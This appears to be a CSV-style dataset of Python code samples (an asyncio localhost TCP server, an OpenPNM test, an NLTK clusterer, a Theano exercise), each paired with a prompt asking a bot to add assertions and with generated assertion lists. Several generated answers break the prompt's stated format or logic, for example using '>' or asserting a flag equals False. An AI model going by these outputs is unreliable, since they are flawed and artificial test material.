94        called.  This method runs the loop until the server sockets
95        are ready to accept connections.
96        """"""
97        self.server = loop.run_until_complete(
98            asyncio.streams.start_server(self._accept_client,
99                                         '127.0.0.1', 12345,
100                                         loop=loop))
101
102    def stop(self, loop):
103        """"""
104        Stops the TCP server, i.e. closes the listening socket(s).
105
106        This method runs the loop until the server sockets are closed.
107        """"""
108        if self.server is not None:
109            self.server.close()
110            loop.run_until_complete(self.server.wait_closed())
111            self.server = None
112
113
114def main():
115    loop = asyncio.get_event_loop()
116
117    # creates a server and starts listening to TCP connections
118    server = MyServer()
119    server.start(loop)
120
121    @asyncio.coroutine
122    def client():
123        reader, writer = yield From(asyncio.streams.open_connection(
124            '127.0.0.1', 12345, loop=loop))
125
126        def send(msg):
127            print(""> "" + msg)
128            writer.write((msg + '\n').encode(""utf-8""))
129
130        def recv():
131            msgback = (yield From(reader.readline()))
132            msgback = msgback.decode(""utf-8"").rstrip()
133            print(""< "" + msgback)
134            raise Return(msgback)
135
136        # send a line
137        send(""add 1 2"")
138        msg = yield From(recv())
139
140        send(""repeat 5 hello"")
141        msg = yield From(recv())
142        while True:
143            msg = yield From(recv())
144            if msg == 'end':
145                break
146
147        writer.close()
148        yield From(asyncio.sleep(0.5))
149
150    # creates a client and connects to our server
151    try:
152        loop.run_until_complete(client())
153        server.stop(loop)
154    finally:
155        loop.close()
156
157
158if __name__ == '__main__':
159    main()
160","[['msg', '==', ""'begin'""]]",1,1,1.0,0.0001861504095309,"['self.server', 'self.clients', 'client_reader', 'client_writer', 'task', 'self.clients[task]', 'data', 'parts', 'cmd', 'args', 'arg1', 'arg2', 'retval', 'times', 'msg', 'loop', 'server', 'reader', 'writer', 'msgback']",20,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.server', 'self.clients', 'client_reader', 'client_writer', 'task', 'self.clients[task]', 'data', 'parts', 'cmd', 'args', 'arg1', 'arg2', 'retval', 'times', 'msg', 'loop', 'server', 'reader', 'writer', 'msgback']
*Code:

1""""""
2Example of a simple TCP server that is written in (mostly) coroutine
3style and uses asyncio.streams.start_server() and
4asyncio.streams.open_connection().
5
6Note that running this example starts both the TCP server and client
7in the same process.  It listens on port 12345 on 127.0.0.1, so it will
8fail if this port is currently in use.
9""""""
10
11from __future__ import print_function
12import sys
13import trollius as asyncio
14import asyncio.streams
15from trollius import From, Return
16
17
18class MyServer:
19    """"""
20    This is just an example of how a TCP server might be potentially
21    structured.  This class has basically 3 methods: start the server,
22    handle a client, and stop the server.
23
24    Note that you don't have to follow this structure, it is really
25    just an example or possible starting point.
26    """"""
27
28    def __init__(self):
29        self.server = None # encapsulates the server sockets
30
31        # this keeps track of all the clients that connected to our
32        # server.  It can be useful in some cases, for instance to
33        # kill client connections or to broadcast some data to all
34        # clients...
35        self.clients = {} # task -> (reader, writer)
36
37    def _accept_client(self, client_reader, client_writer):
38        """"""
39        This method accepts a new client connection and creates a Task
40        to handle this client.  self.clients is updated to keep track
41        of the new client.
42        """"""
43
44        # start a new Task to handle this specific client connection
45        task = asyncio.Task(self._handle_client(client_reader, client_writer))
46        self.clients[task] = (client_reader, client_writer)
47
48        def client_done(task):
49            print(""client task done:"", task, file=sys.stderr)
50            del self.clients[task]
51
52        task.add_done_callback(client_done)
53
54    @asyncio.coroutine
55    def _handle_client(self, client_reader, client_writer):
56        """"""
57        This method actually does the work to handle the requests for
58        a specific client.  The protocol is line oriented, so there is
59        a main loop that reads a line with a request and then sends
60        out one or more lines back to the client with the result.
61        """"""
62        while True:
63            data = (yield From(client_reader.readline()))
64            data = data.decode(""utf-8"")
65            if not data: # an empty string means the client disconnected
66                break
67            parts = data.rstrip().split(' ')
68            cmd = parts[0]
69            args = parts[1:]
70            if cmd == 'add':
71                arg1 = float(args[0])
72                arg2 = float(args[1])
73                retval = arg1 + arg2
74                client_writer.write(""{0!r}\n"".format(retval).encode(""utf-8""))
75            elif cmd == 'repeat':
76                times = int(args[0])
77                msg = args[1]
78                client_writer.write(""begin\n"".encode(""utf-8""))
79                for idx in range(times):
80                    client_writer.write(""{0}. {1}\n"".format(idx+1, msg)
81                                        .encode(""utf-8""))
82                client_writer.write(""end\n"".encode(""utf-8""))
83            else:
84                print(""Bad command {0!r}"".format(data), file=sys.stderr)
85
86            # This enables us to have flow control in our connection.
87            yield From(client_writer.drain())
88
89    def start(self, loop):
90        """"""
91        Starts the TCP server, so that it listens on port 12345.
92
93        For each client that connects, the accept_client method gets
94        called.  This method runs the loop until the server sockets
95        are ready to accept connections.
96        """"""
97        self.server = loop.run_until_complete(
98            asyncio.streams.start_server(self._accept_client,
99                                         '127.0.0.1', 12345,
100                                         loop=loop))
101
102    def stop(self, loop):
103        """"""
104        Stops the TCP server, i.e. closes the listening socket(s).
105
106        This method runs the loop until the server sockets are closed.
107        """"""
108        if self.server is not None:
109            self.server.close()
110            loop.run_until_complete(self.server.wait_closed())
111            self.server = None
112
113
114def main():
115    loop = asyncio.get_event_loop()
116
117    # creates a server and starts listening to TCP connections
118    server = MyServer()
119    server.start(loop)
120
121    @asyncio.coroutine
122    def client():
123        reader, writer = yield From(asyncio.streams.open_connection(
124            '127.0.0.1', 12345, loop=loop))
125
126        def send(msg):
127            print(""> "" + msg)
128            writer.write((msg + '\n').encode(""utf-8""))
129
130        def recv():
131            msgback = (yield From(reader.readline()))
132            msgback = msgback.decode(""utf-8"").rstrip()
133            print(""< "" + msgback)
134            raise Return(msgback)
135
136        # send a line
137        send(""add 1 2"")
138        msg = yield From(recv())
139
140        send(""repeat 5 hello"")
141        msg = yield From(recv())
142        while True:
143            msg = yield From(recv())
144            if msg == 'end':
145                break
146
147        writer.close()
148        yield From(asyncio.sleep(0.5))
149
150    # creates a client and connects to our server
151    try:
152        loop.run_until_complete(client())
153        server.stop(loop)
154    finally:
155        loop.close()
156
157
158if __name__ == '__main__':
159    main()
160",7313,"[[37, 'client_reader', '!=', None, ""Client reader must not be None""],
[37, 'client_writer', '!=', None, ""Client writer must not be None""],
[45, 'task', '!=', None, ""Task must not be None""],
[70, 'args', '!=', [], ""Args should not be empty""],
[71, 'arg1', '>=', 0, ""arg1 should be a positive number""],
[72, 'arg2', '>=', 0, ""arg2 should be a positive number""],
[76, 'times', '>=', 0, ""Times should be a non-negative integer""],
[77, 'msg', '!=', '', ""Msg should not be an empty string""],
[89, 'loop', '!=', None, ""Loop should not be None""],
[118, 'server', '!=', None, ""Server instance should not be None""],
[131, 'msgback', '!=', '', ""message back should not be an empty string""],
[137, 'msg', '!=', '', ""message should not be an empty string""],
[140, 'msg', '!=', '', ""message should not be an empty string""],
[155, 'loop', '!=', None, ""Loop should not be None""]]"
TomTranter/OpenPNM,"import numpy as np
import scipy as sp
import openpnm as op


class ThroatShapeFactorTest:

    def setup_class(self):
        self.net = op.network.Cubic(shape=[5, 5, 5], spacing=1.0)
        self.geo = op.geometry.GenericGeometry(network=self.net,
                                               pores=self.net.Ps,
                                               throats=self.net.Ts)
        self.air = op.phases.Air(network=self.net)
        self.phys = op.physics.GenericPhysics(network=self.net,
                                              phase=self.air,
                                              geometry=self.geo)
        self.geo['throat.area'] = 1.0
        self.geo['throat.perimeter'] = sp.pi
        self.geo['throat.diameter'] = (4/sp.pi)**(1/2)

    def test_compactness(self):
        pass

    def test_mason_morrow(self):
        mod = op.models.geometry.throat_shape_factor.mason_morrow
        self.geo.add_model(propname='throat.shape_factor',
                           model=mod,
                           throat_perimeter='throat.perimeter',
                           throat_area='throat.area',
                           regen_mode='normal')
        a = np.unique(self.geo['throat.shape_factor'])
        b = np.array(0.10132118, ndmin=1)
        assert np.allclose(a, b)

    def test_jenkins_rao(self):
        mod = op.models.geometry.throat_shape_factor.jenkins_rao
        self.geo.add_model(propname='throat.shape_factor',
                           model=mod,
                           throat_perimeter='throat.perimeter',
                           throat_area='throat.area',
                           throat_diameter='throat.diameter',
                           regen_mode='normal')
        a = np.unique(self.geo['throat.shape_factor'])
        b = np.array(0.88622693, ndmin=1)
        assert np.allclose(a, b)


if __name__ == '__main__':

    t = ThroatShapeFactorTest()
    self = t
    t.setup_class()
    for item in t.__dir__():
        if item.startswith('test'):
            print('running test: '+item)
            t.__getattribute__(item)()
","
1import numpy as np
2import scipy as sp
3import openpnm as op
4
5
6class ThroatShapeFactorTest:
7
8    def setup_class(self):
9        self.net = op.network.Cubic(shape=[5, 5, 5], spacing=1.0)
10        self.geo = op.geometry.GenericGeometry(network=self.net,
11                                               pores=self.net.Ps,
12                                               throats=self.net.Ts)
13        self.air = op.phases.Air(network=self.net)
14        self.phys = op.physics.GenericPhysics(network=self.net,
15                                              phase=self.air,
16                                              geometry=self.geo)
17        self.geo['throat.area'] = 1.0
18        self.geo['throat.perimeter'] = sp.pi
19        self.geo['throat.diameter'] = (4/sp.pi)**(1/2)
20
21    def test_compactness(self):
22        pass
23
24    def test_mason_morrow(self):
25        mod = op.models.geometry.throat_shape_factor.mason_morrow
26        self.geo.add_model(propname='throat.shape_factor',
27                           model=mod,
28                           throat_perimeter='throat.perimeter',
29                           throat_area='throat.area',
30                           regen_mode='normal')
31        a = np.unique(self.geo['throat.shape_factor'])
32        b = np.array(0.10132118, ndmin=1)
33
34    def test_jenkins_rao(self):
35        mod = op.models.geometry.throat_shape_factor.jenkins_rao
36        self.geo.add_model(propname='throat.shape_factor',
37                           model=mod,
38                           throat_perimeter='throat.perimeter',
39                           throat_area='throat.area',
40                           throat_diameter='throat.diameter',
41                           regen_mode='normal')
42        a = np.unique(self.geo['throat.shape_factor'])
43        b = np.array(0.88622693, ndmin=1)
44
45
46if __name__ == '__main__':
47
48    t = ThroatShapeFactorTest()
49    self = t
50    t.setup_class()
51    for item in t.__dir__():
52        if item.startswith('test'):
53            print('running test: '+item)
54            t.__getattribute__(item)()
55","[['np.allclose(a', '==', 'True'], ['np.allclose(a', '==', 'True']]",2,2,1.0,0.0009546539379474,"['self.net', 'self.geo', 'self.air', 'self.phys', ""self.geo['throat.area']"", ""self.geo['throat.perimeter']"", ""self.geo['throat.diameter']"", 'mod', 'a', 'b', 't']",11,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.net', 'self.geo', 'self.air', 'self.phys', ""self.geo['throat.area']"", ""self.geo['throat.perimeter']"", ""self.geo['throat.diameter']"", 'mod', 'a', 'b', 't']
*Code:

1import numpy as np
2import scipy as sp
3import openpnm as op
4
5
6class ThroatShapeFactorTest:
7
8    def setup_class(self):
9        self.net = op.network.Cubic(shape=[5, 5, 5], spacing=1.0)
10        self.geo = op.geometry.GenericGeometry(network=self.net,
11                                               pores=self.net.Ps,
12                                               throats=self.net.Ts)
13        self.air = op.phases.Air(network=self.net)
14        self.phys = op.physics.GenericPhysics(network=self.net,
15                                              phase=self.air,
16                                              geometry=self.geo)
17        self.geo['throat.area'] = 1.0
18        self.geo['throat.perimeter'] = sp.pi
19        self.geo['throat.diameter'] = (4/sp.pi)**(1/2)
20
21    def test_compactness(self):
22        pass
23
24    def test_mason_morrow(self):
25        mod = op.models.geometry.throat_shape_factor.mason_morrow
26        self.geo.add_model(propname='throat.shape_factor',
27                           model=mod,
28                           throat_perimeter='throat.perimeter',
29                           throat_area='throat.area',
30                           regen_mode='normal')
31        a = np.unique(self.geo['throat.shape_factor'])
32        b = np.array(0.10132118, ndmin=1)
33
34    def test_jenkins_rao(self):
35        mod = op.models.geometry.throat_shape_factor.jenkins_rao
36        self.geo.add_model(propname='throat.shape_factor',
37                           model=mod,
38                           throat_perimeter='throat.perimeter',
39                           throat_area='throat.area',
40                           throat_diameter='throat.diameter',
41                           regen_mode='normal')
42        a = np.unique(self.geo['throat.shape_factor'])
43        b = np.array(0.88622693, ndmin=1)
44
45
46if __name__ == '__main__':
47
48    t = ThroatShapeFactorTest()
49    self = t
50    t.setup_class()
51    for item in t.__dir__():
52        if item.startswith('test'):
53            print('running test: '+item)
54            t.__getattribute__(item)()
55",3672,"[[9, 'self.net', '!=', None, ""the network object should be initialized""],
[18, ""self.geo['throat.area']"", '>', 0, ""throat area should be a positive number""],
[19, ""self.geo['throat.perimeter']"", '>', 0, ""throat perimeter should be a positive number""],
[20, ""self.geo['throat.diameter']"", '>', 0, ""throat diameter should be a positive number""],
[31, 'a', '!=', None, ""array 'a' should have been generated after the model operation""],
[33, 'b', '!=', None, ""array 'b' should be initialized""],
[42, 'a', '!=', None, ""array 'a' should have been generated after the model operation""],
[43, 'b', '!=', None, ""array 'b' should be initialized""]]"
davidjonas/alice_python,"# Natural Language Toolkit: Group Average Agglomerative Clusterer
#
# Copyright (C) 2004-2006 University of Melbourne
# Author: Trevor Cohn <tacohn@cs.mu.oz.au>
# Porting: Steven Bird <sb@csse.unimelb.edu.au>
# URL: <http://nltk.sf.net>
# For license information, see LICENSE.TXT

from en.parser.nltk_lite.cluster import *

class GroupAverageAgglomerative(VectorSpace):
    """"""
    The GAAC clusterer starts with each of the N vectors as singleton
    clusters. It then iteratively merges pairs of clusters which have the
    closest centroids.  This continues until there is only one cluster. The
    order of merges gives rise to a dendogram: a tree with the earlier merges
    lower than later merges. The membership of a given number of clusters c, 1
    <= c <= N, can be found by cutting the dendogram at depth c.

    This clusterer uses the cosine similarity metric only, which allows for
    efficient speed-up in the clustering process. 
    """"""

    def __init__(self, num_clusters=1, normalise=True, svd_dimensions=None):
        VectorSpace.__init__(self, normalise, svd_dimensions)
        self._num_clusters = num_clusters
        self._dendogram = None
        self._groups_values = None

    def cluster(self, vectors, assign_clusters=False, trace=False):
        # stores the merge order
        self._dendogram = Dendogram(
            [array(vector, numpy.float64) for vector in vectors])
        return VectorSpace.cluster(self, vectors, assign_clusters, trace)

    def cluster_vectorspace(self, vectors, trace=False):
        # create a cluster for each vector
        clusters = [[vector] for vector in vectors]

        # the sum vectors
        vector_sum = copy.copy(vectors)

        while len(clusters) > max(self._num_clusters, 1):
            # find the two best candidate clusters to merge, based on their
            # S(union c_i, c_j)
            best = None
            for i in range(len(clusters)):
                for j in range(i + 1, len(clusters)):
                    sim = self._average_similarity(
                                vector_sum[i], len(clusters[i]),
                                vector_sum[j], len(clusters[j]))
                    if not best or sim > best[0]:
                        best = (sim, i, j)

            # merge them and replace in cluster list
            i, j = best[1:]
            sum = clusters[i] + clusters[j]
            if trace: print 'merging %d and %d' % (i, j)

            clusters[i] = sum
            del clusters[j]
            vector_sum[i] = vector_sum[i] + vector_sum[j]
            del vector_sum[j]

            self._dendogram.merge(i, j)

        self.update_clusters(self._num_clusters)

    def update_clusters(self, num_clusters):
        clusters = self._dendogram.groups(num_clusters)
        self._centroids = []
        for cluster in clusters:
            assert len(cluster) > 0
            if self._should_normalise:
                centroid = self._normalise(cluster[0])
            else:
                centroid = array(cluster[0])
            for vector in cluster[1:]:
                if self._should_normalise:
                    centroid += self._normalise(vector)
                else:
                    centroid += vector
            centroid /= float(len(cluster))
            self._centroids.append(centroid)
        self._num_clusters = len(self._centroids)

    def classify_vectorspace(self, vector):
        best = None
        for i in range(self._num_clusters):
            centroid = self._centroids[i]
            sim = self._average_similarity(vector, 1, centroid, 1)
            if not best or sim > best[0]:
                best = (sim, i)
        return best[1]

    def dendogram(self):
        """"""
        @return: The dendogram representing the current clustering
        @rtype:  Dendogram
        """"""
        return self._dendogram

    def num_clusters(self):
        return self._num_clusters

    def _average_similarity(self, v1, l1, v2, l2):
        sum = v1 + v2
        length = l1 + l2
        return (numpy.dot(sum, sum) - length) / (length * (length - 1))

    def __repr__(self):
        return '<GroupAverageAgglomerative Clusterer n=%d>' % self._num_clusters

def demo():
    """"""
    Non-interactive demonstration of the clusterers with simple 2-D data.
    """"""

    from en.parser.nltk_lite import cluster

    # use a set of tokens with 2D indices
    vectors = [array(f) for f in [[3, 3], [1, 2], [4, 2], [4, 0], [2, 3], [3, 1]]]
    
    # test the GAAC clusterer with 4 clusters
    clusterer = cluster.GroupAverageAgglomerative(4)
    clusters = clusterer.cluster(vectors, True)

    print 'Clusterer:', clusterer
    print 'Clustered:', vectors
    print 'As:', clusters
    print
    
    # show the dendogram
    clusterer.dendogram().show()

    # classify a new vector
    vector = array([3, 3])
    print 'classify(%s):' % vector,
    print clusterer.classify(vector)
    print


if __name__ == '__main__':
    demo()
","
1# Natural Language Toolkit: Group Average Agglomerative Clusterer
2#
3# Copyright (C) 2004-2006 University of Melbourne
4# Author: Trevor Cohn <tacohn@cs.mu.oz.au>
5# Porting: Steven Bird <sb@csse.unimelb.edu.au>
6# URL: <http://nltk.sf.net>
7# For license information, see LICENSE.TXT
8
9from en.parser.nltk_lite.cluster import *
10
11class GroupAverageAgglomerative(VectorSpace):
12    """"""
13    The GAAC clusterer starts with each of the N vectors as singleton
14    clusters. It then iteratively merges pairs of clusters which have the
15    closest centroids.  This continues until there is only one cluster. The
16    order of merges gives rise to a dendogram: a tree with the earlier merges
17    lower than later merges. The membership of a given number of clusters c, 1
18    <= c <= N, can be found by cutting the dendogram at depth c.
19
20    This clusterer uses the cosine similarity metric only, which allows for
21    efficient speed-up in the clustering process. 
22    """"""
23
24    def __init__(self, num_clusters=1, normalise=True, svd_dimensions=None):
25        VectorSpace.__init__(self, normalise, svd_dimensions)
26        self._num_clusters = num_clusters
27        self._dendogram = None
28        self._groups_values = None
29
30    def cluster(self, vectors, assign_clusters=False, trace=False):
31        # stores the merge order
32        self._dendogram = Dendogram(
33            [array(vector, numpy.float64) for vector in vectors])
34        return VectorSpace.cluster(self, vectors, assign_clusters, trace)
35
36    def cluster_vectorspace(self, vectors, trace=False):
37        # create a cluster for each vector
38        clusters = [[vector] for vector in vectors]
39
40        # the sum vectors
41        vector_sum = copy.copy(vectors)
42
43        while len(clusters) > max(self._num_clusters, 1):
44            # find the two best candidate clusters to merge, based on their
45            # S(union c_i, c_j)
46            best = None
47            for i in range(len(clusters)):
48                for j in range(i + 1, len(clusters)):
49                    sim = self._average_similarity(
50                                vector_sum[i], len(clusters[i]),
51                                vector_sum[j], len(clusters[j]))
52                    if not best or sim > best[0]:
53                        best = (sim, i, j)
54
55            # merge them and replace in cluster list
56            i, j = best[1:]
57            sum = clusters[i] + clusters[j]
58            if trace: print 'merging %d and %d' % (i, j)
59
60            clusters[i] = sum
61            del clusters[j]
62            vector_sum[i] = vector_sum[i] + vector_sum[j]
63            del vector_sum[j]
64
65            self._dendogram.merge(i, j)
66
67        self.update_clusters(self._num_clusters)
68
69    def update_clusters(self, num_clusters):
70        clusters = self._dendogram.groups(num_clusters)
71        self._centroids = []
72        for cluster in clusters:
73            if self._should_normalise:
74                centroid = self._normalise(cluster[0])
75            else:
76                centroid = array(cluster[0])
77            for vector in cluster[1:]:
78                if self._should_normalise:
79                    centroid += self._normalise(vector)
80                else:
81                    centroid += vector
82            centroid /= float(len(cluster))
83            self._centroids.append(centroid)
84        self._num_clusters = len(self._centroids)
85
86    def classify_vectorspace(self, vector):
87        best = None
88        for i in range(self._num_clusters):
89            centroid = self._centroids[i]
90            sim = self._average_similarity(vector, 1, centroid, 1)
91            if not best or sim > best[0]:
92                best = (sim, i)
93        return best[1]
94
95    def dendogram(self):
96        """"""
97        @return: The dendogram representing the current clustering
98        @rtype:  Dendogram
99        """"""
100        return self._dendogram
101
102    def num_clusters(self):
103        return self._num_clusters
104
105    def _average_similarity(self, v1, l1, v2, l2):
106        sum = v1 + v2
107        length = l1 + l2
108        return (numpy.dot(sum, sum) - length) / (length * (length - 1))
109
110    def __repr__(self):
111        return '<GroupAverageAgglomerative Clusterer n=%d>' % self._num_clusters
112
113def demo():
114    """"""
115    Non-interactive demonstration of the clusterers with simple 2-D data.
116    """"""
117
118    from en.parser.nltk_lite import cluster
119
120    # use a set of tokens with 2D indices
121    vectors = [array(f) for f in [[3, 3], [1, 2], [4, 2], [4, 0], [2, 3], [3, 1]]]
122    
123    # test the GAAC clusterer with 4 clusters
124    clusterer = cluster.GroupAverageAgglomerative(4)
125    clusters = clusterer.cluster(vectors, True)
126
127    print 'Clusterer:', clusterer
128    print 'Clustered:', vectors
129    print 'As:', clusters
130    print
131    
132    # show the dendogram
133    clusterer.dendogram().show()
134
135    # classify a new vector
136    vector = array([3, 3])
137    print 'classify(%s):' % vector,
138    print clusterer.classify(vector)
139    print
140
141
142if __name__ == '__main__':
143    demo()
144","[['len(cluster)', '>', '0']]",1,1,1.0,0.0002006823198876,"['num_clusters', 'normalise', 'svd_dimensions', 'self._num_clusters', 'self._dendogram', 'self._groups_values', 'vectors', 'assign_clusters', 'trace', 'clusters', 'vector_sum', 'best', 'sim', 'i', 'j', 'sum', 'clusters[i]', 'vector_sum[i]', 'self._centroids', 'centroid', 'vector', 'v1', 'l1', 'v2', 'l2', 'length', 'clusterer']",27,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['num_clusters', 'normalise', 'svd_dimensions', 'self._num_clusters', 'self._dendogram', 'self._groups_values', 'vectors', 'assign_clusters', 'trace', 'clusters', 'vector_sum', 'best', 'sim', 'i', 'j', 'sum', 'clusters[i]', 'vector_sum[i]', 'self._centroids', 'centroid', 'vector', 'v1', 'l1', 'v2', 'l2', 'length', 'clusterer']
*Code:

1# Natural Language Toolkit: Group Average Agglomerative Clusterer
2#
3# Copyright (C) 2004-2006 University of Melbourne
4# Author: Trevor Cohn <tacohn@cs.mu.oz.au>
5# Porting: Steven Bird <sb@csse.unimelb.edu.au>
6# URL: <http://nltk.sf.net>
7# For license information, see LICENSE.TXT
8
9from en.parser.nltk_lite.cluster import *
10
11class GroupAverageAgglomerative(VectorSpace):
12    """"""
13    The GAAC clusterer starts with each of the N vectors as singleton
14    clusters. It then iteratively merges pairs of clusters which have the
15    closest centroids.  This continues until there is only one cluster. The
16    order of merges gives rise to a dendogram: a tree with the earlier merges
17    lower than later merges. The membership of a given number of clusters c, 1
18    <= c <= N, can be found by cutting the dendogram at depth c.
19
20    This clusterer uses the cosine similarity metric only, which allows for
21    efficient speed-up in the clustering process. 
22    """"""
23
24    def __init__(self, num_clusters=1, normalise=True, svd_dimensions=None):
25        VectorSpace.__init__(self, normalise, svd_dimensions)
26        self._num_clusters = num_clusters
27        self._dendogram = None
28        self._groups_values = None
29
30    def cluster(self, vectors, assign_clusters=False, trace=False):
31        # stores the merge order
32        self._dendogram = Dendogram(
33            [array(vector, numpy.float64) for vector in vectors])
34        return VectorSpace.cluster(self, vectors, assign_clusters, trace)
35
36    def cluster_vectorspace(self, vectors, trace=False):
37        # create a cluster for each vector
38        clusters = [[vector] for vector in vectors]
39
40        # the sum vectors
41        vector_sum = copy.copy(vectors)
42
43        while len(clusters) > max(self._num_clusters, 1):
44            # find the two best candidate clusters to merge, based on their
45            # S(union c_i, c_j)
46            best = None
47            for i in range(len(clusters)):
48                for j in range(i + 1, len(clusters)):
49                    sim = self._average_similarity(
50                                vector_sum[i], len(clusters[i]),
51                                vector_sum[j], len(clusters[j]))
52                    if not best or sim > best[0]:
53                        best = (sim, i, j)
54
55            # merge them and replace in cluster list
56            i, j = best[1:]
57            sum = clusters[i] + clusters[j]
58            if trace: print 'merging %d and %d' % (i, j)
59
60            clusters[i] = sum
61            del clusters[j]
62            vector_sum[i] = vector_sum[i] + vector_sum[j]
63            del vector_sum[j]
64
65            self._dendogram.merge(i, j)
66
67        self.update_clusters(self._num_clusters)
68
69    def update_clusters(self, num_clusters):
70        clusters = self._dendogram.groups(num_clusters)
71        self._centroids = []
72        for cluster in clusters:
73            if self._should_normalise:
74                centroid = self._normalise(cluster[0])
75            else:
76                centroid = array(cluster[0])
77            for vector in cluster[1:]:
78                if self._should_normalise:
79                    centroid += self._normalise(vector)
80                else:
81                    centroid += vector
82            centroid /= float(len(cluster))
83            self._centroids.append(centroid)
84        self._num_clusters = len(self._centroids)
85
86    def classify_vectorspace(self, vector):
87        best = None
88        for i in range(self._num_clusters):
89            centroid = self._centroids[i]
90            sim = self._average_similarity(vector, 1, centroid, 1)
91            if not best or sim > best[0]:
92                best = (sim, i)
93        return best[1]
94
95    def dendogram(self):
96        """"""
97        @return: The dendogram representing the current clustering
98        @rtype:  Dendogram
99        """"""
100        return self._dendogram
101
102    def num_clusters(self):
103        return self._num_clusters
104
105    def _average_similarity(self, v1, l1, v2, l2):
106        sum = v1 + v2
107        length = l1 + l2
108        return (numpy.dot(sum, sum) - length) / (length * (length - 1))
109
110    def __repr__(self):
111        return '<GroupAverageAgglomerative Clusterer n=%d>' % self._num_clusters
112
113def demo():
114    """"""
115    Non-interactive demonstration of the clusterers with simple 2-D data.
116    """"""
117
118    from en.parser.nltk_lite import cluster
119
120    # use a set of tokens with 2D indices
121    vectors = [array(f) for f in [[3, 3], [1, 2], [4, 2], [4, 0], [2, 3], [3, 1]]]
122    
123    # test the GAAC clusterer with 4 clusters
124    clusterer = cluster.GroupAverageAgglomerative(4)
125    clusters = clusterer.cluster(vectors, True)
126
127    print 'Clusterer:', clusterer
128    print 'Clustered:', vectors
129    print 'As:', clusters
130    print
131    
132    # show the dendogram
133    clusterer.dendogram().show()
134
135    # classify a new vector
136    vector = array([3, 3])
137    print 'classify(%s):' % vector,
138    print clusterer.classify(vector)
139    print
140
141
142if __name__ == '__main__':
143    demo()
144",6980,"[[24, 'num_clusters', '>=', 1, ""We need at least one cluster""],
 [30, 'vectors', '!=', [], ""We need at least one vector to perform clustering""],
 [30, 'assign_clusters', '==', False, ""We should only check cluster assignment if it's necessary""],
 [36, 'vectors', '!=', [], ""We need at least one vector to perform clustering""],
 [67, 'self._num_clusters', '>=', 1, ""We need at least one cluster after update""],
 [74, 'centroid', '!=', None, ""The centroid should not be None""],
 [85, 'self._num_clusters', '==', 'len(self._centroids)', ""Number of clusters should equal to the length of centroids""],
 [87, 'vector', '!=', None, ""The vector to be classified should not be None""],
 [102, 'self._num_clusters', '>=', 1, ""We need at least one cluster after clustering""],
 [105, 'v1', '!=', None, ""Vectors v1 and v2 should not be None for similarity calculation""],
 [105, 'v2', '!=', None, ""Vectors v1 and v2 should not be None for similarity calculation""]]"
DeercoderResearch/theano_exercises,"# Fill in the TODOs then run the script to see if your solution works.
import numpy as np

import theano
from theano import function
from theano.sandbox.rng_mrg import MRG_RandomStreams
import theano.tensor as T

def energy(W, V, H):
    """"""
    W : A theano matrix of RBM weights
        num visible x num hidden
    V : A theano matrix of assignments to visible units
        Each row is another configuration
        Each column corresponds to a different unit
    H : A theano matrix of assignments to hidden units
        Each row is another configuration
        Each column corresponds to a different unit
    Returns:
        E: a theano vector
        Element i gives the energy of configuration (V[i,:], H[i,:])
        (This RBM has no biases, only weights)
    """"""
    return -(T.dot(V, W) * H).sum(axis=1)

def grad_expected_energy(W, V, H):
    """"""
    W : A theano matrix of RBM weights
        num visible x num hidden
    V : A theano matrix of samples of visible units
        Each row is another samples
        Each column corresponds to a different unit
    H : A theano matrix of samples of hidden units
        Each row is another samples
        Each column corresponds to a different unit

    Returns:
        dW: a matrix of the derivatives of the expected gradient
            of the energy
    """"""

    raise NotImplementedError(""TODO: implement this function."")


if __name__ == ""__main__"":
    m = 2
    nv = 3
